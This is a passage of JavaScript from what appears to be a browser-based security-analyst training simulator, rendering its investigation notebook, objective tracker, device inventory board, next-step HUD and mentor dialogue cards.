        ${reviewedFilesReopenHtml()}
        ${investigationFeedHtml()}
        ${classHtml}
        ${analystJudgmentHtml()}
        ${caseFileSummaryHtml()}
        ${identifyHtml}
        ${responseHtml}
      </div>`;
    } else {
      host.innerHTML = `
      ${notebookPanelHeadHtml(alert)}
      <div class="sim-evidence-body">
        ${confidenceMeterHtml()}
        ${objectiveTrackHtml()}
        ${sparringCarryHtml()}
        ${viewbar}
        ${evSection}
        ${reviewedFilesReopenHtml()}
        ${inventoryBoardHtml()}
        ${investigationFeedHtml()}
        ${analystJudgmentHtml()}
        ${findingsHtml()}
        ${analystBetHtml()}
        ${calibrationHtml()}
        ${twoVoiceHtml()}
        ${mentorTrailHtml()}
        ${analystPowersHtml()}
        ${caseFileSummaryHtml()}
        ${classHtml}
        ${identifyHtml}
        ${responseHtml}
      </div>`;
    }
    const body = host.querySelector('.sim-evidence-body');
    applyNotebookChrome(body, grew);  // collapse toggles + status tags (presentation-only)
    if (body && grew) {
      const newest = newestEvidence();
      // In simple mode the newest finding lands on the always-open Case Board card;
      // otherwise pull the eye to the pending comms / feed as before.
      const target = (simpleUi && body.querySelector('.sim-caseboard'))
        || (newest && body.querySelector(`.sim-comms--pending[data-ev="${newest.id}"]`))
        || body.querySelector('.sim-comms--pending')
        || body.querySelector('.sim-feed')
        || body.querySelector('.sim-caseboard');
      if (target) simScrollBodyTo(body, target);
      void body.offsetWidth;                 // restart the highlight animation
      body.classList.add('sim-evidence-body--flash');
    } else if (body) {
      body.scrollTop = prevScroll;           // keep the player where they were
    }
    if (body && confChanged) {
      const meter = body.querySelector('.sim-confidence');
      if (meter) {
        void meter.offsetWidth;                // restart the meter animations
        meter.classList.add('sim-confidence--flash');
        if (confRose) meter.classList.add('sim-confidence--rose');  // directional micro-nudge
      }
    }
    syncDecisionDock();  // mirror the active decision into the bottom dock + lock the terminal
    return;
  }

  // Detect newly-filled notebook sections here (the single render chokepoint) so
  // the feed can flag them; no-op on Mission 1 (it never opts into the feed).
  noteNotebookSections({
    reflection: reflectHtml, risks: risksHtml, extras: extrasHtml,
    classification: classHtml, identification: identifyHtml, response: responseHtml,
  });

  host.innerHTML = `
    ${notebookPanelHeadHtml('')}
    <div class="sim-evidence-body">
      ${confidenceMeterHtml()}
      ${viewbar}
      ${evSection}
      ${reviewedFilesReopenHtml()}
      ${investigationFeedHtml()}
      ${risksHtml}
      ${extrasHtml}
      ${reflectHtml}
      ${classHtml}
      ${identifyHtml}
      ${responseHtml}
    </div>`;
  applyNotebookChrome(host.querySelector('.sim-evidence-body'), false);  // collapse toggles + status tags
  syncDecisionDock();  // gated internally — hides the dock + unlocks for non-case-file missions
}

/* ================================================================== *
 * PROGRESSIVE OBJECTIVES + APPROVED-vs-OBSERVED BOARD (presentation-only)
 * ------------------------------------------------------------------ *
 * Both are additive, data-gated notebook sections. They READ SIM state and
 * mission data only — no scoring, no setDiscoveryJudgment, no persistence.
 * Missions without def.objectiveTrack / def.inventory render '' (unchanged). */

/* Is one objective predicate currently satisfied? Predicates are strings:
 *   ev:<id>        a finding has surfaced
 *   flag:<key>     a mission flag is raised
 *   challenge:<id> a two-step discovery judgment is fully answered
 *   identify       an identification has been recorded (NOT "is correct")
 *   decision       a response has been recorded / the mission reached report
 * Fails closed on any unknown predicate so a typo can never falsely complete. */
function objectivePredicateMet(pred) {
  if (typeof pred !== 'string') return false;
  const i = pred.indexOf(':');
  const kind = i >= 0 ? pred.slice(0, i) : pred;
  const arg = i >= 0 ? pred.slice(i + 1) : '';
  switch (kind) {
    case 'ev':    return SIM.evidence.has(arg);
    case 'flag':  return !!(CAREER.missionFlags && CAREER.missionFlags[arg]);
    case 'challenge': {
      const ch = ((SIM.def && SIM.def.discoveryChallenges) || []).find(c => c.id === arg);
      return !!ch && challengeAnswered(ch);
    }
    case 'identify': return SIM.identified != null;
    case 'decision': return SIM.decision != null || SIM.stage === 'report';
    default:         return false;
  }
}

/* Compute each tracked objective's state. An objective is DONE only when ALL of
 * its doneBy predicates are met; the first not-done objective is ACTIVE. Returns
 * null when the mission opts out (no def.objectiveTrack). */
function objectiveTrackState() {
  const track = (SIM.def && SIM.def.objectiveTrack) || null;
  if (!Array.isArray(track) || !track.length) return null;
  const rows = track.map(o => {
    const conds = Array.isArray(o.doneBy) ? o.doneBy : (o.doneBy ? [o.doneBy] : []);
    return { label: o.label || '', done: conds.length > 0 && conds.every(objectivePredicateMet), active: false };
  });
  const firstOpen = rows.find(r => !r.done);
  if (firstOpen) firstOpen.active = true;
  return rows;
}

/* The live OBJECTIVES section: ticks as evidence/flags/judgments resolve. */
function objectiveTrackHtml() {
  let rows = null;
  try { rows = objectiveTrackState(); } catch (_) { rows = null; }
  if (!rows) return '';
  const doneN = rows.filter(r => r.done).length;
  const items = rows.map(r => {
    const cls = r.done ? 'done' : r.active ? 'active' : 'todo';
    const icon = r.done ? '\u2713' : r.active ? '\u25B8' : '\u25CB';
    const status = r.done ? 'Done' : r.active ? 'In progress' : 'Not started';
    return `<li class="sim-obj sim-obj--${cls}">
        <span class="sim-obj-icon" aria-hidden="true">${icon}</span>
        <span class="sim-obj-text">${mapEsc(r.label)}</span>
        <span class="sim-sr-only">${status}</span>
      </li>`;
  }).join('');
  return `
    <div class="sim-notebook-section sim-obj-track">
      <div class="sim-notebook-head sim-notebook-head--obj">OBJECTIVES <span class="sim-notebook-count">${doneN}/${rows.length}</span></div>
      <ul class="sim-obj-list">${items}</ul>
    </div>`;
}

/* APPROVED vs OBSERVED comparison board — a two-column diff that makes the
 * "what should be here" vs "what is actually here" reasoning explicit. Hidden
 * until its revealBy finding surfaces. Data-gated on def.inventory. */
function inventoryBoardHtml() {
  const inv = SIM.def && SIM.def.inventory;
  if (!inv || !inv.revealBy || !SIM.evidence.has(inv.revealBy)) return '';
  const approved = Array.isArray(inv.approved) ? inv.approved : [];
  const observed = Array.isArray(inv.observed) ? inv.observed : [];
  const apRows = approved.map(a => `
        <li class="sim-inv-row">
          <span class="sim-inv-ip">${mapEsc(a.ip || '')}</span>
          <span class="sim-inv-label">${mapEsc(a.label || '')}</span>
        </li>`).join('');
  const obRows = observed.map(o => {
    const bad = o.approved === false;
    const mark = bad
      ? '<span class="sim-inv-tag">NOT APPROVED</span>'
      : '<span class="sim-inv-ok" aria-hidden="true">\u2713</span>';
    return `
        <li class="sim-inv-row${bad ? ' sim-inv-row--flag' : ''}">
          <span class="sim-inv-ip">${mapEsc(o.ip || '')}</span>
          <span class="sim-inv-label">${mapEsc(o.label || '')}</span>
          ${mark}
        </li>`;
  }).join('');
  const flagged = observed.filter(o => o.approved === false).length;
  const note = inv.note || (flagged
    ? `${flagged} observed device${flagged === 1 ? '' : 's'} not on the approved list.` : '');
  return `
    <div class="sim-notebook-section sim-inv">
      <div class="sim-notebook-head sim-notebook-head--inv">${mapEsc(inv.title || 'APPROVED vs OBSERVED')}</div>
      <div class="sim-inv-cols">
        <div class="sim-inv-col">
          <div class="sim-inv-coltitle">${mapEsc(inv.approvedLabel || 'Approved')}</div>
          <ul class="sim-inv-list">${apRows}</ul>
        </div>
        <div class="sim-inv-col sim-inv-col--observed">
          <div class="sim-inv-coltitle">${mapEsc(inv.observedLabel || 'Observed')}</div>
          <ul class="sim-inv-list">${obRows}</ul>
        </div>
      </div>
      ${note ? `<p class="sim-inv-note">${mapEsc(note)}</p>` : ''}
    </div>`;
}

/* One evidence item, presented at the active depth. Beginner mode leads with
 * plain language + why-it-matters + a reasoning prompt, then discloses Analyst
 * Notes and Technical Details on demand. Analyst mode leads with the analyst
 * observation and discloses Technical Details. Per-item reveal state lives in
 * SIM.evReveal so it survives the panel's full re-renders. */
function renderEvItem(e, mode) {
  const tier = e.qualityWeight >= 3 ? 'KEY' : e.qualityWeight === 2 ? 'NOTABLE' : 'MINOR';
  const L = evLayers(e);
  const reveal = SIM.evReveal[e.id]; // undefined | 'analyst' | 'technical'

  // Simplified first-day workspace (Mission 1, gated on def.uiComplexityLevel):
  // a COMPACT card — the finding statement + tier only — with all supporting
  // detail (why it matters, analyst notes, technical lines) tucked behind ONE
  // per-card expander. The inline coaching prompt is intentionally DROPPED here:
  // the same "what stands out?" question is already posed in the Decision Dock,
  // so showing it on every card too is pure duplication. Reuses SIM.evReveal (any
  // truthy value = open) so the open/closed state survives the panel's full
  // re-renders. Presentation-only; every other mission falls through to the
  // unchanged beginner/analyst paths below (byte-for-byte identical).
  if (simpleUiMode()) {
    const open = !!reveal;
    let cbody = `<div class="sim-ev-plain">${L.beginner.summary}</div>`;
    if (open) {
      if (L.beginner.why) cbody += `<div class="sim-ev-why"><span class="sim-ev-why-label">Why it matters</span>${L.beginner.why}</div>`;
      cbody += `<div class="sim-ev-layer sim-ev-layer--analyst"><span class="sim-ev-layer-label">Analyst notes</span><span class="sim-ev-layer-text">${L.analyst}</span>${evTermsHtml(L.terms)}</div>`;
      cbody += `<div class="sim-ev-layer sim-ev-layer--tech"><span class="sim-ev-layer-label">Technical details</span><pre class="sim-ev-tech">${L.technical}</pre></div>`;
    }
    const cControl = open
      ? layerBtn(e.id, 'hide', 'Hide details ▴')
      : layerBtn(e.id, 'technical', 'Show details ▾');
    return `
    <div class="sim-ev-item sim-ev-item--compact sim-ev-item--${tier.toLowerCase()}" data-ev-id="${e.id}">
      <div class="sim-ev-meta">
        <span class="sim-ev-quality">${tier} FINDING</span>
        <span class="sim-ev-src">${e.source || ''}</span>
      </div>
      <div class="sim-ev-content">${cbody}</div>
      <div class="sim-ev-controls">${cControl}</div>
    </div>`;
  }

  let body = '';
  let control = '';

  if (mode === 'beginner') {
    body += `<div class="sim-ev-plain">${L.beginner.summary}</div>`;
    if (L.beginner.why) body += `<div class="sim-ev-why"><span class="sim-ev-why-label">Why it matters</span>${L.beginner.why}</div>`;
    if (L.beginner.prompt) body += `<div class="sim-ev-prompt">${L.beginner.prompt}</div>`;
    if (reveal === 'analyst' || reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--analyst"><span class="sim-ev-layer-label">Analyst notes</span><span class="sim-ev-layer-text">${L.analyst}</span>${evTermsHtml(L.terms)}</div>`;
    }
    if (reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--tech"><span class="sim-ev-layer-label">Technical details</span><pre class="sim-ev-tech">${L.technical}</pre></div>`;
    }
    if (!reveal)                control = layerBtn(e.id, 'analyst', 'Show analyst notes ▾');
    else if (reveal === 'analyst') control = layerBtn(e.id, 'technical', 'Show technical details ▾');
    else                        control = layerBtn(e.id, 'hide', 'Hide details ▴');
  } else {
    body += `<div class="sim-ev-plain">${L.analyst}</div>`;
    body += evTermsHtml(L.terms);
    if (reveal === 'technical') {
      body += `<div class="sim-ev-layer sim-ev-layer--tech"><span class="sim-ev-layer-label">Technical details</span><pre class="sim-ev-tech">${L.technical}</pre></div>`;
      control = layerBtn(e.id, 'hide', 'Hide technical details ▴');
    } else {
      control = layerBtn(e.id, 'technical', 'Show technical details ▾');
    }
  }

  return `
    <div class="sim-ev-item sim-ev-item--${mode} sim-ev-item--${tier.toLowerCase()}" data-ev-id="${e.id}">
      <div class="sim-ev-meta">
        <span class="sim-ev-quality">${tier} FINDING</span>
        <span class="sim-ev-src">${e.source || ''}</span>
      </div>
      <div class="sim-ev-content">${body}</div>
      <div class="sim-ev-controls">${control}</div>
    </div>`;
}
function layerBtn(id, level, label) {
  return `<button type="button" class="sim-ev-more" data-ev-reveal="${id}" data-ev-level="${level}">${label}</button>`;
}

/* The first surfaced evidence item that carries a reflection config. */
function activeReflectionEv() {
  return simEvidenceDefs().find(e => e.reflection && SIM.evidence.has(e.id)) || null;
}

/* ACTIVE INVESTIGATION FEED — a compact, always-current notebook strip that
 * surfaces (1) the newest finding, (2) the judgment it asks for, and (3) a
 * suggested next step. Presentation-only: it renders existing SIM state, routes
 * any judgment through the existing data-judgment handler (setJudgment), writes
 * nothing, and adds NO scoring path. Collapses to nothing until a finding surfaces. */
function newestEvidence() {
  if (!SIM.evidence || SIM.evidence.size === 0) return null;
  let id = SIM.lastEvidenceId;
  if (!id || !SIM.evidence.has(id)) {
    const arr = Array.from(SIM.evidence); // Set preserves insertion order
    id = arr[arr.length - 1];
  }
  return id ? evidenceById(id) : null;
}

/* The single, PURE state reader for "what should I do next" on the file-model
 * mission. Returns {text, chips:[{label,cmd}]} where chips are click-to-run
 * suggestions (routed through simRunCommand). Reads SIM/def only — writes
 * nothing, runs no command, touches no scoring. Returns {text:'',chips:[]} for
 * non-file-model missions (M2–M4 keep their own per-command c.next). Drives the
 * "→ Next:" scrollback line (A), the persistent HUD (C), and the unlock
 * handoff (D), so all three speak with one voice. */
function simNextAction() {
  if (!markupEnabled()) return { text: '', chips: [] };
  if (decisionLocked()) {
    return { text: 'Sarah needs your call — answer in the Decision Dock below.', chips: [] };
  }
  if (!investigationComplete()) {
    const undiscovered = simFiles().filter(f => !fileClassificationVisible(f));
    const chips = [];
    undiscovered.slice(0, 3).forEach(f => chips.push({ label: f.name, cmd: 'cat ' + f.name }));
    const grepReady = grepTriageEnabled() && fileModelGrepUnlocked();
    if (grepReady) {
      const sugg = (SIM.def && Array.isArray(SIM.def.grepSuggestions)) ? SIM.def.grepSuggestions : [];
      sugg.slice(0, 3).forEach(t => chips.push({ label: 'grep ' + t, cmd: 'grep ' + t }));
    }
    const text = grepReady
      ? 'Open a file with  cat  — or  grep  the folder for sensitivity markers.'
      : 'Open the next file with  cat  to assess what it holds.';
    return { text, chips };
  }
  if (SIM.stage === 'investigation') {
    return { text: 'All findings are in — type  decide  to choose how to handle the release.',
             chips: [{ label: 'decide', cmd: 'decide' }] };
  }
  return { text: '', chips: [] };
}

/* Print a single plain-language "→ Next:" line in the terminal — but ONLY when
 * the line is usable and there is still investigating to do. The completion path
 * ("All findings are in…") and the grep-unlock coaching each own their own beat,
 * so this defers to them (it never double-speaks). Presentation-only. */
function maybePrintNextStep() {
  if (!markupEnabled()) return;
  if (decisionLocked()) return;            // the dock is the next step right now
  if (investigationComplete()) return;     // completion nudge owns this beat
  if (SIM.grepNudgePending) return;        // a deferred grep-unlock nudge owns this beat
  const na = simNextAction();
  if (na && na.text) simPrint('\u2192 Next: ' + na.text, 'next');
}

// HUD next-action change tracker — transient module state (never persisted) so
// the cue replays its entrance animation only when the instruction changes.
let lastHudNextText = '';

/* The persistent terminal HUD (file-model mission only): the active objective +
 * the single best next action with a clickable chip, pinned just above the
 * command line so the player always has a compass. While the dock holds the
 * line it flips to "answer Sarah". Presentation-only — reads SIM, writes ONLY
 * #simHud (never re-renders the panel, so it is safe to call from the render
 * chokepoint). Hidden for command-model missions.
 *
 * Beginner-guidance missions (def.investigationGuidance) add a louder, animated
 * "mission control" treatment via the .sim-hud--guided class: NEXT becomes the
 * primary call-to-action, and once Sarah is waiting a pulse + downward arrow
 * point at the Decision Dock below. Gated on the flag, never forked on a mission
 * id; still presentation-only (no scoring, no answer text). */
function renderSimHud() {
  const hud = document.getElementById('simHud');
  if (!hud) return;
  if (!markupEnabled()) {
    hud.hidden = true; hud.innerHTML = '';
    hud.classList.remove('sim-hud--guided');
    lastHudNextText = '';
    return;
  }

  const guided = !!(SIM.def && SIM.def.investigationGuidance);
  hud.classList.toggle('sim-hud--guided', guided);

  let objHtml = '';
  let rows = null;
  try { rows = objectiveTrackState(); } catch (_) { rows = null; }
  if (rows && rows.length) {
    const doneN = rows.filter(r => r.done).length;
    const active = rows.find(r => r.active);
    const label = active ? active.label : 'All objectives complete';
    const idx = active ? doneN + 1 : rows.length;
    objHtml = `<div class="sim-hud-obj">
        <span class="sim-hud-obj-tag">OBJECTIVE ${idx}/${rows.length}</span>
        <span class="sim-hud-obj-text">${mapEsc(label)}</span>
      </div>`;
  }

  const na = simNextAction();
  let nextHtml = '';
  if (na && (na.text || (na.chips && na.chips.length))) {
    const locked = decisionLocked();
    const chips = (!locked && na.chips && na.chips.length)
      ? na.chips.map(c => `<button type="button" class="sim-cmd-chip" data-run-cmd="${mapEsc(c.cmd)}">${mapEsc(c.label)}</button>`).join('')
      : '';
    // Replay the entrance only when the instruction actually changes, so the cue
    // catches the eye on a new step without flickering on routine repaints.
    const changed = guided && na.text && na.text !== lastHudNextText;
    if (na.text) lastHudNextText = na.text;
    // Beginner cue only: a calm pointer while working; a pulse + downward arrow
    // toward the Decision Dock below once Sarah is waiting on the call.
    const marker = guided
      ? (locked
          ? '<span class="sim-hud-next-pulse" aria-hidden="true"></span>'
          : '<span class="sim-hud-next-icon" aria-hidden="true">\u25B8</span>')
      : '';
    const arrow = (guided && locked)
      ? '<span class="sim-hud-next-arrow" aria-hidden="true">\u25BE</span>'
      : '';
    nextHtml = `<div class="sim-hud-next${locked ? ' sim-hud-next--locked' : ''}${changed ? ' sim-hud-next--enter' : ''}">
        ${marker}<span class="sim-hud-next-label">NEXT</span>
        <span class="sim-hud-next-text">${mapEsc(na.text)}</span>
        ${chips ? `<span class="sim-hud-chips">${chips}</span>` : ''}${arrow}
      </div>`;
  }

  if (!objHtml && !nextHtml) {
    hud.hidden = true; hud.innerHTML = '';
    lastHudNextText = '';
    return;
  }
  hud.hidden = false;
  hud.innerHTML = objHtml + nextHtml;
}

const NOTEBOOK_SECTION_LABELS = {
  reflection: 'Reasoning prompt',
  risks: 'Risk notes',
  extras: 'Notebook notes',
  classification: 'File classification',
  identification: 'Identification',
  response: 'Response plan',
};

/* Track which notebook sections have filled in so the feed can show a brief
 * "notebook updated" notice the first time a new one appears. Presentation-only:
 * mutates transient SIM trackers, writes no progress and adds no scoring. Called
 * once per panel render (the single chokepoint) so the HTML builders stay
 * side-effect free. No-op unless the mission opts into the state-summary feed
 * (def.investigationFeed — set on all four missions). NOTE: this is the
 * PRE-EXISTING feed gate; the newer beginner guidance bundle (stage bar, RECENT
 * ACTIVITY log, progressive focus) is gated separately on def.investigationGuidance
 * and is Mission-1-only. */
function noteNotebookSections(sections) {
  if (!SIM.def || !SIM.def.investigationFeed) return;
  if (!SIM.notebookSeen) SIM.notebookSeen = new Set();
  let newest = '';
  Object.keys(sections).forEach(key => {
    if (sections[key] && !SIM.notebookSeen.has(key)) {
      SIM.notebookSeen.add(key);
      newest = NOTEBOOK_SECTION_LABELS[key] || '';
    }
  });
  if (newest) SIM.notebookNotice = newest;
}

function investigationFeedHtml() {
  // Opt-in via the dataset flag; a mission without it returns '' (panel unchanged).
  if (!SIM.def || !SIM.def.investigationFeed) return '';

  // (1) STATE SUMMARY — newest finding + the comms step it asks for + next step.
  // Collapses until the first finding surfaces; the chronological log below still
  // renders the earlier "shift started" / "objective" events, so the feed shows
  // activity from the very first frame.
  const latest = newestEvidence();
  let summary = '';
  if (latest) {
    // A TEXT pointer to the pending judgment on the card below. The card is the
    // single interactive surface (no buttons here), so judgment state lives in
    // exactly one place.
    const vis = visibleDiscoveryChallenges().filter(challengeValid);
    const pendingObs = vis.find(c => !stepAnswered(c, 'observation'));
    const pendingJust = vis.find(c => stepAnswered(c, 'observation') && !stepAnswered(c, 'justification'));
    let judgeBlock = '';
    if (pendingObs) {
      judgeBlock = `<div class="sim-feed-judge">
        <span class="sim-feed-judge-label">On comms</span>
        <span class="sim-feed-judge-value">Sarah's waiting on your read of "${pendingObs.short}" — answer her below.</span></div>`;
    } else if (pendingJust) {
      judgeBlock = `<div class="sim-feed-judge">
        <span class="sim-feed-judge-label">On comms</span>
        <span class="sim-feed-judge-value">Sarah wants to know why "${pendingJust.short}" matters — tell her below.</span></div>`;
    } else if (vis.length) {
      judgeBlock = `<div class="sim-feed-judge sim-feed-judge--done">
        <span class="sim-feed-judge-label">Comms</span>
        <span class="sim-feed-judge-value">You and Sarah are in sync on every finding so far.</span></div>`;
    }
    const next = caseFileNextStep();
    summary = `
      <div class="sim-feed-row">
        <span class="sim-feed-tag">Newest finding</span>
        <span class="sim-feed-text">${latest.label}</span>
      </div>
      ${judgeBlock}
      ${next ? `<div class="sim-feed-row sim-feed-row--next">
        <span class="sim-feed-tag">Next step</span>
        <span class="sim-feed-text">${next}</span></div>` : ''}`;
  }

  // (2) CHRONOLOGICAL ACTIVITY LOG — a plain-language record of what happened,
  // newest first. Every line is authored or derived from neutral facts (file and
  // command names, the player's own search term); it never interprets evidence or
  // hints at the verdict.
  // The RECENT ACTIVITY log is part of the Mission-1-only guidance bundle
  // (def.investigationGuidance). Other missions keep the state summary above but
  // not the chronological log.
  const feed = (SIM.def.investigationGuidance && Array.isArray(SIM.feed)) ? SIM.feed : [];
  const logRows = feed.slice().reverse().map(f =>
    `<li class="sim-feed-log-row sim-feed-log-row--${mapEsc(f.kind)}"><span class="sim-feed-log-text">${mapEsc(f.text)}</span></li>`
  ).join('');
  const log = logRows
    ? `<div class="sim-feed-log">
        <div class="sim-feed-log-head">RECENT ACTIVITY</div>
        <ul class="sim-feed-log-list">${logRows}</ul>
      </div>`
    : '';

  if (!summary && !log) return '';
  return `
    <div class="sim-feed" role="status" aria-live="polite">
      <div class="sim-feed-head">ACTIVE INVESTIGATION</div>
      ${summary}
      ${log}
    </div>`;
}

/* Append a plain-language event to the Active Investigation Feed log (Task #154).
 * Transient only — SIM.feed resets every mission and is never persisted. Dedupes
 * the last entry and caps the log so it stays a short, readable trail. NO render
 * side effect: every emit site already runs through renderEvidencePanel(). No-op
 * unless the mission opts into the feed. */
function emitFeed(kind, text) {
  if (!SIM.def || !SIM.def.investigationGuidance) return;
  if (!Array.isArray(SIM.feed)) SIM.feed = [];
  const t = String(text == null ? '' : text).trim();
  if (!t) return;
  const last = SIM.feed[SIM.feed.length - 1];
  if (last && last.text === t) return;        // dedupe consecutive duplicates
  SIM.feed.push({ kind: kind || 'event', text: t });
  if (SIM.feed.length > 12) SIM.feed = SIM.feed.slice(-12);
}

/* The mission's lead objective label, for the feed's "objective assigned" event.
 * Reads the computed objective rows (process steps only — never an answer); empty
 * for a mission without an objective track. */
function feedObjectiveLabel() {
  let rows = null;
  try { rows = objectiveTrackState(); } catch (_) { rows = null; }
  if (rows && rows.length) return rows[0].label || '';
  return '';
}

/* Workflow stage indicator (Task #154). Maps the engine's coarse SIM.stage
 * (investigation | decision | report) onto five player-facing stages so the
 * analyst always knows where they are in the case. Pure reader — derives from
 * existing transient progress, writes no state and never scores. */
function stageState() {
  const stages = [
    { key: 'briefing', label: 'Briefing' },
    { key: 'evidence', label: 'Evidence Review' },
    { key: 'analysis', label: 'Analysis' },
    { key: 'decision', label: 'Decision' },
    { key: 'feedback', label: 'Feedback' },
  ];
  let activeKey;
  if (SIM.stage === 'report') activeKey = 'feedback';
  else if (SIM.stage === 'decision') activeKey = 'decision';
  else {
    const started = (SIM.read && SIM.read.size) ||
      (SIM.ranCommands && SIM.ranCommands.size) ||
      (SIM.evidence && SIM.evidence.size);
    let complete = false;
    try { complete = investigationComplete(); } catch (_) { complete = false; }
    if (!started) activeKey = 'briefing';
    else if (!complete) activeKey = 'evidence';
    else activeKey = 'analysis';
  }
  const ai = stages.findIndex(s => s.key === activeKey);
  return stages.map((s, i) => ({ key: s.key, label: s.label, active: i === ai, done: i < ai }));
}

/* Paint the compact stage stepper (#simStageBar). Presentation-only and
 * explanation-free (stage names only — never a hint about the verdict). Also
 * publishes the active stage onto #careerOps[data-stage] for the Progressive UI
 * Focus layer (T-F) — a CSS-only, desktop-only SUBTLE emphasis; no persisted
 * state and no answer hint. */
function renderStageBar() {
  // Mission-1-only: the stage bar AND the progressive UI focus (data-stage) belong
  // to the Phase 1B guidance bundle (def.investigationGuidance). Other missions get
  // neither — rows stays null so the attribute is cleared and the bar stays hidden.
  const rows = (SIM.def && SIM.def.investigationGuidance) ? stageState() : null;
  // Progressive UI Focus (Task #154, T-F) — expose the current stage so CSS can
  // gently de-emphasize the genuinely-secondary panels. Set/cleared here (the one
  // chokepoint) so it always tracks state; cleared when no mission is active.
  const ops = document.getElementById('careerOps');
  if (ops) {
    const activeKey = rows && (rows.find(s => s.active) || {}).key;
    if (activeKey) ops.setAttribute('data-stage', activeKey);
    else ops.removeAttribute('data-stage');
  }
  const host = document.getElementById('simStageBar');
  if (!host) return;
  if (!rows) { host.hidden = true; host.innerHTML = ''; return; }
  const items = rows.map((s, i) => {
    const state = s.active ? 'active' : s.done ? 'done' : 'todo';
    const mark = s.done ? '✓' : String(i + 1);
    return `<li class="sim-stage sim-stage--${state}"${s.active ? ' aria-current="step"' : ''}>
      <span class="sim-stage-dot" aria-hidden="true">${mark}</span>
      <span class="sim-stage-label">${s.label}</span>
    </li>`;
  }).join('');
  host.innerHTML = `<ol class="sim-stage-list">${items}</ol>`;
  host.hidden = false;
}

/* Render glossary chips for a file's focusTerms (Task #154) — reuses the existing
 * hover-definition mechanism; presentation-only. */
function focusTermsHtml(terms) {
  if (!Array.isArray(terms) || !terms.length) return '';
  const chips = terms.map(t => glossaryTermHtml(t)).filter(Boolean).join(' ');
  return chips ? `<span class="sim-file-focus-terms">${chips}</span>` : '';
}

/* Reviewed-files reopen strip (Task #154) — lets the analyst reopen any file they
 * have already read back into the File Reader from the notebook. File-model only
 * (returns '' when the mission has no files); reopening surfaces no new evidence
 * and never touches the terminal history. */
function reviewedFilesReopenHtml() {
  const files = simFiles();
  if (!files.length) return '';
  const read = SIM.read || new Set();
  const rows = files.filter(f => read.has(f.name)).map(f =>
    `<button type="button" class="sim-reopen-chip${SIM.activeFile === f.name ? ' sim-reopen-chip--on' : ''}" data-reopen="${mapEsc(f.name)}"${SIM.activeFile === f.name ? ' aria-current="true"' : ''}>${mapEsc(f.name)}</button>`
  ).join('');
  if (!rows) return '';
  return `
    <div class="sim-notebook-section sim-reopen">
      <div class="sim-notebook-head sim-notebook-head--reopen">REVIEWED FILES <span class="sim-notebook-count">${read.size}</span></div>
      <p class="sim-reopen-hint">Reopen a file you've read to study it again.</p>
      <div class="sim-reopen-list">${rows}</div>
    </div>`;
}

/* "What concerns you?" — a checklist of plain-language observations followed by
 * a Benign / Suspicious / Malicious judgment. This teaches analytical thinking;
 * it is intentionally UNGRADED and touches no resources, flags, or scoring. */
function reflectionCardHtml(e) {
  const r = e.reflection;
  const st = SIM.reflection;
  const concerns = (r.concerns || []).map((c, i) => {
    const on = st.concerns.has(i);
    return `<button type="button" class="sim-concern${on ? ' sim-concern--on' : ''}" data-concern="${i}" aria-pressed="${on}">` +
      `<span class="sim-concern-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${c}</span></button>`;
  }).join('');
  const judgments = JUDGMENTS.map(j =>
    `<button type="button" class="sim-judgment${st.judgment === j ? ' sim-judgment--on' : ''}" data-judgment="${j}" aria-pressed="${st.judgment === j}">${j}</button>`
  ).join('');
  const feedback = st.judgment
    ? `<div class="sim-reflect-feedback"><span class="sim-reflect-feedback-label">Analyst note</span>${r.feedback || ''}</div>`
    : '';
  return `
    <div class="sim-reflect">
      <div class="sim-reflect-head">${r.title || 'REVIEW THE SUSPICIOUS ACTIVITY'}</div>
      <div class="sim-reflect-prompt">${r.prompt || 'What concerns you?'}</div>
      <div class="sim-reflect-concerns">${concerns}</div>
      <div class="sim-reflect-prompt sim-reflect-prompt--judge">${r.judgmentPrompt || 'Based on your findings, how would you judge this activity?'}</div>
      <div class="sim-reflect-judgments">${judgments}</div>
      ${feedback}
    </div>`;
}

/* ------------------------------------------------------------------ *
 * CASE-FILE NOTEBOOK + GRADED DISCOVERY CARDS (Investigation-First, M1)
 * ------------------------------------------------------------------ *
 * Rendered ONLY when SIM.def.caseFileNotebook is set. The graded discovery
 * challenges become the interactive "ANALYST JUDGMENT" cards; the reactive risks
 * and the recorded judgments are synthesised into a FACT / ASSESSMENT / REASON /
 * UNKNOWNS / RECOMMENDATIONS case file. Presentation-only beyond
 * setDiscoveryJudgment (the sole writer, already gated). Missions without the
 * flag never reach any of this. */

/* Present an authored Sarah line as a chat bubble: strip the redundant
 * "— Sarah Reyes" attribution and any wrapping quotes, since the bubble already
 * shows who is speaking. Presentation-only; never alters the stored string. */
function commsSpeech(raw) {
  let s = (raw || '').trim();
  s = s.replace(/\s*[—–-]\s*Sarah Reyes\s*$/i, '').trim();
  s = s.replace(/^["'\u201c\u2018]\s*/, '').replace(/\s*["'\u201d\u2019]$/, '').trim();
  return s;
}

/* One turn of the comms exchange (observation or justification): Sarah asks, then
 * either the player's response options ("things you say") or — once recorded —
 * the player's chosen line plus Sarah's reply. NEVER reveals which option is
 * correct: unchosen options are not rendered after a reply, and no correctness
 * styling is emitted. The reply buttons keep the data-discovery-judgment hooks so
 * the sole writer (setDiscoveryJudgment) is unchanged. */
function discoveryStepHtml(ch, step, label) {
  const cfg = challengeStep(ch, step);
  if (!cfg) return '';
  const ans = challengeAnswers(ch)[step];
  const answered = !!ans;
  const stepNo = step === 'justification' ? 2 : 1;
  let html = `
    <div class="sim-comms-turn sim-comms-turn--${step} ${answered ? 'sim-comms-turn--done' : 'sim-comms-turn--open'}">
      <div class="sim-comms-cuebar">
        <span class="sim-comms-cuebar-step">Q${stepNo}</span>
        <span class="sim-comms-cuebar-text">${label}</span>
        ${answered ? '<span class="sim-comms-cuebar-done" aria-hidden="true">\u2713</span>' : ''}
      </div>
      <div class="sim-comms-msg sim-comms-msg--sarah">
        <span class="sim-comms-avatar" aria-hidden="true">SR</span>
        <div class="sim-comms-bubble sim-comms-bubble--ask">${cfg.prompt || ''}</div>
      </div>`;
  if (!answered) {
    const opts = stepOptionsOrdered(ch, step).map((o, i) =>
      `<button type="button" class="sim-comms-reply" data-discovery-judgment data-challenge="${ch.id}" data-step="${step}" data-option="${o.id}"><span class="sim-comms-reply-key" aria-hidden="true">${String.fromCharCode(65 + i)}</span><span class="sim-comms-reply-text">${o.label}</span></button>`
    ).join('');
    html += `
      <div class="sim-comms-replies" role="group" aria-label="Your response to Sarah">
